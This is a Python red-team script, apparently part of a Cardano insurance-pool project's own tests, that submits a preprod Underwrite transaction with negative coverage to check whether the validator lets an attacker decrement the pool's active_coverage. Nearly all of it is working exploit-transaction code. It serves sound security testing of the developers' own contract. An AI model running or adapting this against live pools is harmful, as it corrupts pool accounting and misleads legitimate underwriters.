"""Red-team A-024 — Negative coverage in Underwrite redeemer.

Hypothesis: ``is_ratio_acceptable`` (pricing.ak) allows ``coverage <= 0``
because Aiken's integer division floors toward negative infinity:
``-5 / 2_000_000 = -1 <= 50`` evaluates True. ``verify_underwrite_datum``
requires ``new_active == old_active + coverage`` with no non-negativity
bound on ``new_active``. Combined, an attacker can pay 2 ADA premium to
DECREMENT pool ``active_coverage`` by an arbitrary amount.

Impact: pool's perceived "available capacity" is inflated. Subsequent
legitimate underwriters are misled about how much coverage the pool can
back. State-corruption attack with bounded financial damage but real
accounting drift.

Test vector: coverage = -5_000_000 lovelace, premium = 2_000_000.
"""
from __future__ import annotations

import sys
import pathlib

import pycardano as pyc

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "api"))

from offchain.scripts._common import (
    assert_operator_mode, banner, load_operator_wallet, make_preprod_context,
)


def main() -> int:
    assert_operator_mode()
    banner("RED TEAM A-024 — negative coverage Underwrite")

    ctx = make_preprod_context()
    wallet = load_operator_wallet()

    from chain import (
        POOL_SCRIPT_ADDRESS, POOL_REF_SCRIPT_UTXO_ID, POLICY_SCRIPT_ADDRESS,
        POOL_SCRIPT_HASH, ORACLE_NFT_POLICY_ID, PREPROD_SLOT_ZERO_POSIX,
    )
    from policies import (
        PolicyDatum, UnderwriteRedeemer, POOL_SPEND_EX_UNITS,
        _generate_policy_id, MIN_UTXO_LOVELACE,
    )
    from pool import _find_pool_utxo, _utxo_lovelace, PoolDatum, _resolve_ref_utxo
    from _treasury import calculate_treasury_cut
    from _donation_tx_builder import DonatingTxBuilder

    pool_utxo, pool_datum = _find_pool_utxo(ctx)
    print(f"[pool] active_coverage BEFORE: {pool_datum.active_coverage}")

    coverage_lovelace = -5_000_000  # NEGATIVE
    premium_lovelace = 2_000_000
    duration_days = 1
    strike_price_scaled = 350_000

    insured_pkh = bytes(wallet.address.payment_part)
    chain_posix_ms = (PREPROD_SLOT_ZERO_POSIX + ctx.last_block_slot) * 1000
    start_time_ms = chain_posix_ms - 120_000
    expiry_time_ms = start_time_ms + duration_days * 86_400_000
    # _generate_policy_id can't handle negative coverage; hand-roll an id.
    import hashlib
    policy_id = hashlib.blake2b(
        insured_pkh + b"a024-attack" + str(coverage_lovelace).encode(),
        digest_size=28,
    ).digest()
    policy_datum = PolicyDatum(
        policy_id=policy_id, insured=insured_pkh,
        strike_price=strike_price_scaled,
        coverage_amount=coverage_lovelace,  # negative
        premium_paid=premium_lovelace,
        start_time=start_time_ms, expiry_time=expiry_time_ms,
        oracle_nft=bytes.fromhex(ORACLE_NFT_POLICY_ID),
        pool_script_hash=bytes.fromhex(POOL_SCRIPT_HASH),
        pool_nft=pool_datum.pool_nft,
    )
    protocol_fee = premium_lovelace * pool_datum.protocol_fee_bps // 10_000
    net_premium = premium_lovelace - protocol_fee
    new_pool_datum = PoolDatum(
        total_liquidity=pool_datum.total_liquidity + net_premium,
        active_coverage=pool_datum.active_coverage + coverage_lovelace,  # SHRINKS
        lp_token_policy=pool_datum.lp_token_policy,
        protocol_fee_bps=pool_datum.protocol_fee_bps,
        pool_nft=pool_datum.pool_nft, lp_supply=pool_datum.lp_supply,
    )
    print(f"[attack] coverage={coverage_lovelace} (NEGATIVE)")
    print(f"[attack] new_pool_datum.active_coverage={new_pool_datum.active_coverage}")

    treasury_cut = calculate_treasury_cut(premium_lovelace, pool_datum.protocol_fee_bps)
    builder = DonatingTxBuilder(ctx, treasury_donation=treasury_cut)
    builder.add_input_address(wallet.address)

    pool_ref_utxo = _resolve_ref_utxo(ctx, POOL_REF_SCRIPT_UTXO_ID, "pool validator")
    underwrite_redeemer = pyc.Redeemer(
        UnderwriteRedeemer(coverage=coverage_lovelace, premium=premium_lovelace),
        ex_units=POOL_SPEND_EX_UNITS,
    )
    builder.add_script_input(
        utxo=pool_utxo, redeemer=underwrite_redeemer,
        script=pool_ref_utxo.output.script,
    )

    policy_address = pyc.Address.from_primitive(POLICY_SCRIPT_ADDRESS)
    builder.add_output(pyc.TransactionOutput(
        address=policy_address,
        amount=MIN_UTXO_LOVELACE,  # >= negative coverage trivially
        datum=policy_datum,
    ))

    pool_address = pyc.Address.from_primitive(POOL_SCRIPT_ADDRESS)
    pool_input_value = pool_utxo.output.amount
    new_pool_lovelace = _utxo_lovelace(pool_utxo) + premium_lovelace
    if hasattr(pool_input_value, "multi_asset") and pool_input_value.multi_asset:
        new_pool_value = pyc.Value(
            coin=new_pool_lovelace, multi_asset=pool_input_value.multi_asset,
        )
    else:
        new_pool_value = pyc.Value(coin=new_pool_lovelace)
    builder.add_output(pyc.TransactionOutput(
        address=pool_address, amount=new_pool_value, datum=new_pool_datum,
    ))

    try:
        signed_tx = builder.build_and_sign(
            signing_keys=[wallet.skey], change_address=wallet.address,
            merge_change=False,
        )
        tx_hash = ctx.submit_tx(signed_tx.to_cbor())
        print(f"\n!!! ACCEPTED — A-024 CONFIRMED !!!")
        print(f"  tx_hash: {tx_hash}")
        print(f"  Pool active_coverage SHRUNK by {-coverage_lovelace} lovelace")
        print(f"  cardanoscan: https://preprod.cardanoscan.io/transaction/{tx_hash}")
        return 1
    except Exception as e:
        msg = str(e)[:240]
        print(f"\n[VALIDATOR REJECTED]")
        print(f"  Error: {msg}")
        return 0


if __name__ == "__main__":
    sys.exit(main())
